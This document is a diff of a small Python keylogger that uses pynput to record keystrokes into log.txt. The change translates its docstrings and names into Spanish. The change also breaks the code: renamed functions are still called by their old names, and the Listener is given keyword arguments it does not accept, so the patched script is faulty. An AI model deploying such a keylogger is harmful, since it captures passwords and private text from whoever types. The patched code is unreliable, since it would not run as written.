@@ -4,22 +4,22 @@ from pynput.keyboard import Key, Listener
 keys = []
 
 def on_press(key):
-    """Handles key press events."""
+    """Registra las pulsaciones"""
     keys.append(key)
     write_to_log(keys)
 
-def write_to_log(keys):
-    """Converts key events to string and writes to a log file."""
+def escribir_para_registrar(keys):
+    """Convierte las pulsaciones en registros del archivo log.txt"""
     with open('log.txt', 'w') as logfile:
         for key in keys:
             key = str(key).replace("'", "")  # Remove quotes from key string
             logfile.write(key)
 
-def on_release(key):
-    """Stops listener when 'Escape' key is pressed."""
+def soltar(key):
+    """Para el Listener cuando 'ESC' es presionado"""
     if key == Key.esc:
         return False
 
 # Start the listener
-with Listener(on_press=on_press, on_release=on_release) as listener:
+with Listener(presionar=on_press, soltar=on_release) as listener:
     listener.join()
